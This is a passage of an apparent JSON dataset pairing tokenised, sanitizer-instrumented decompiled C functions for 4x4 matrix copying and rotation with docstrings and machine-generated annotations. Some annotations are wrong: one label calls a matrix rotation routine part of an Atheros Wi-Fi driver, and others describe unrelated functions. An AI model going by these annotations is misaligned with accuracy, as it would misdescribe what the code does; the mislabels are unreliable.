            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v6",
            "+",
            "15",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v6",
            "+",
            "15",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v6",
            "+",
            "15",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store_n",
            "(",
            "v6",
            ",",
            "16L",
            "L",
            ")",
            ";",
            "}",
            "v7",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v4",
            "[",
            "16",
            "*",
            "j",
            "]",
            ";",
            "if",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v4",
            "+",
            "16",
            "*",
            "j",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "15",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v7",
            "+",
            "15",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "15",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load_n",
            "(",
            "v7",
            ",",
            "16L",
            "L",
            ")",
            ";",
            "}",
            "v8",
            "=",
            "&",
            "v5",
            "[",
            "16",
            "*",
            "j",
            "]",
            ";",
            "v9",
            "=",
            "&",
            "v4",
            "[",
            "16",
            "*",
            "j",
            "]",
            ";",
            "v10",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v9",
            "+",
            "1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v8",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v9",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v8",
            "+",
            "1",
            ")",
            "=",
            "v10",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22CC60",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22CCA0",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `san_handle` function appears to be a part of a larger codebase related to handling errors and violations in a software system, possibly in a low-level environment, involving socket I/O, mutex handling, and error reporting using the UBsan (Undefined Behavior Sanitizer) framework.",
            "The function \"sub_overflow\" is used to check for overflow conditions during subtraction operations involving unsigned 64-bit integers in different code contexts, including handling for binary math operations and arithmetic expression evaluation.",
            "The function \"overflow\" in the provided code snippets is designed to determine whether a data structure (such as a circular queue or a stack) has reached its maximum capacity, preventing further insertion of elements.",
            "The function `of_bounds` is likely intended to handle errors related to out-of-bounds positional arguments in a formatting system, as indicated by the error message templates provided in the code snippets."
        ],
        "longer_label": "The provided code is a matrix copying function with annotations suggesting it's part of a system involving error handling, particularly for overflow conditions, possibly in a low-level environment, utilizing the UBsan framework for error reporting."
    },
    {
        "id": 210,
        "docstring_tokens": [
            "The",
            "code",
            "rotates",
            "a",
            "4x4",
            "matrix",
            "to",
            "the",
            "right",
            "and",
            "then",
            "copies",
            "the",
            "rotated",
            "matrix",
            "back",
            "to",
            "the",
            "original",
            "matrix",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "cell_0",
            "(",
            "*",
            "m",
            ")",
            "[",
            "4",
            "]",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "char",
            "*",
            "v9",
            ";",
            "cell_0",
            "*",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "cell_0",
            "*",
            "v12",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "char",
            "v15",
            "[",
            "344",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v16",
            ";",
            "v1",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v15",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v2",
            "=",
            "__asan_stack_malloc_3",
            "(",
            "320L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "v1",
            "=",
            "v2",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 256 1 r \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "16",
            ")",
            "=",
            "rotateRight",
            ";",
            "v3",
            "=",
            "v1",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "2147450916",
            ")",
            "=",
            "-",
            "202116109",
            ";",
            "v16",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "287",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v1",
            "+",
            "31",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "287",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store_n",
            "(",
            "v1",
            "+",
            "32",
            ",",
            "256L",
            "L",
            ")",
            ";",
            "}",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ",",
            "0",
            ",",
            "0x100uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            ")",
            "__asan_report_store1",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v1",
            "+",
            "36",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "36",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v1",
            "+",
            "40",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "40",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "44",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v1",
            "+",
            "44",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "44",
            ")",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "v12",
            "=",
            "&",
            "(",
            "*",
            "m",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22CCE0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22CD20",
            ",",
            "j",
            ")",
            ";",
            "v4",
            "=",
            "3",
            "-",
            "i",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "3",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22CE60",
            ",",
            "3L",
            "L",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v4",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22CD60",
            ",",
            "v4",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v12",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v12",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22CDA0",
            ",",
            "v12",
            ")",
            ";",
            "v5",
            "=",
            "16",
            "*",
            "(",
            "4L",
            "L",
            "*",
            "j",
            "+",
            "v4",
            ")",
            "+",
            "16",
            ";",
            "v6",
            "=",
            "16",
            "*",
            "(",
            "4L",
            "L",
            "*",
            "j",
            "+",
            "v4",
            ")",
            "+",
            "v1",
            "+",
            "32",
            ";",
            "if",
            "(",
            "v5",
            ">",
            "0x100",
            "&",
            "&",
            "v6",
            "<",
            "=",
            "v6",
            "+",
            "v5",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22CE00",
            ",",
            "v6",
            ")",
            ";",
            "v7",
            "=",
            "16",
            "*",
            "(",
            "4L",
            "L",
            "*",
            "j",
            "+",
            "v4",
            ")",
            "+",
            "v1",
            "+",
            "32",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_store16",
            "(",
            "v7",
            ")",
            ";",
            "v8",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v12",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v12",
            "+",
            "16",
            "*",
            "j",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v8",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v8",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "15",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v8",
            "+",
            "15",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v8",
            "+",
            "15",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load_n",
            "(",
            "v8",
            ",",
            "16L",
            "L",
            ")",
            ";",
            "}",
            "v9",
            "=",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "352",
            "+",
            "16",
            "*",
            "(",
            "4L",
            "L",
            "*",
            "j",
            "+",
            "v4",
            ")",
            "-",
            "320",
            ")",
            ";",
            "v10",
            "=",
            "&",
            "v12",
            "[",
            "j",
            "]",
            ";",
            "v11",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v10",
            "-",
            ">",
            "c",
            ".",
            "g",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v9",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v10",
            "-",
            ">",
            "state",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v9",
            "+",
            "1",
            ")",
            "=",
            "v11",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22CEA0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22CEE0",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "4",
            ",",
            "4",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "m",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ")",
            ";",
            "if",
            "(",
            "v15",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v1",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8020",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8020",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"an_stack\" appears to be part of a Wi-Fi driver, likely for Atheros hardware, responsible for managing the stack parameters and potentially enabling/disabling a feature related to power saving queues in different operating modes.",
            "The function `malloc` is a memory allocation function typically used to dynamically allocate memory space for variables and data structures, as demonstrated by its implementation within the provided code snippets where it allocates memory with `GlobalAlloc` and is also utilized for array allocation and manipulation in a custom array library.",
            "The function `__readfsqword` is used to read an unsigned 64-bit integer from a specific offset within the FS segment register, typically used in low-level system programming for accessing thread-local storage or other CPU-specific information on x86/x64 architectures."
        ],
        "longer_label": "The code defines a function `rotateRight` that appears to be part of a Wi-Fi driver, potentially for Atheros hardware, involving memory allocation, array manipulation, and low-level system programming operations, likely related to managing stack parameters and enabling/disabling a feature for power saving queues in different operating modes."
    },
    {
        "id": 211,
        "docstring_tokens": [
            "The",
            "code",
            "rotates",
            "a",
            "4x4",
            "matrix",
            "to",
            "the",
            "left",
            "by",
            "90",
            "degrees",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "cell_0",
            "(",
            "*",
            "m",
            ")",
            "[",
            "4",
            "]",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "char",
            "*",
            "v9",
            ";",
            "cell_0",
            "*",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "cell_0",
            "*",
            "v12",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "char",
            "v15",
            "[",
            "344",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v16",
            ";",
            "v1",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v15",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v2",
            "=",
            "__asan_stack_malloc_3",
            "(",
            "320L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "v1",
            "=",
            "v2",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v1",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 256 1 r \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "16",
            ")",
            "=",
            "rotateLeft",
            ";",
            "v3",
            "=",
            "v1",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "2147450916",
            ")",
            "=",
            "-",
            "202116109",
            ";",
            "v16",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "287",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v1",
            "+",
            "31",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "287",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store_n",
            "(",
            "v1",
            "+",
            "32",
            ",",
            "256L",
            "L",
            ")",
            ";",
            "}",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ",",
            "0",
            ",",
            "0x100uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            ")",
            "__asan_report_store1",
            "(",
            "v1",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "32",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v1",
            "+",
            "36",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "36",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v1",
            "+",
            "40",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "40",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "44",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v1",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v1",
            "+",
            "44",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v1",
            "+",
            "44",
            ")",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "v12",
            "=",
            "&",
            "(",
            "*",
            "m",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22CF20",
            ",",
            "j",
            ")",
            ";",
            "v4",
            "=",
            "3",
            "-",
            "j",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "3",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22D0A0",
            ",",
            "3L",
            "L",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v4",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22CF60",
            ",",
            "v4",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22CFA0",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v12",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v12",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22CFE0",
            ",",
            "v12",
            ")",
            ";",
            "v5",
            "=",
            "16",
            "*",
            "(",
            "4L",
            "L",
            "*",
            "v4",
            "+",
            "i",
            ")",
            "+",
            "16",
            ";",
            "v6",
            "=",
            "16",
            "*",
            "(",
            "4L",
            "L",
            "*",
            "v4",
            "+",
            "i",
            ")",
            "+",
            "v1",
            "+",
            "32",
            ";",
            "if",
            "(",
            "v5",
            ">",
            "0x100",
            "&",
            "&",
            "v6",
            "<",
            "=",
            "v6",
            "+",
            "v5",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22D040",
            ",",
            "v6",
            ")",
            ";",
            "v7",
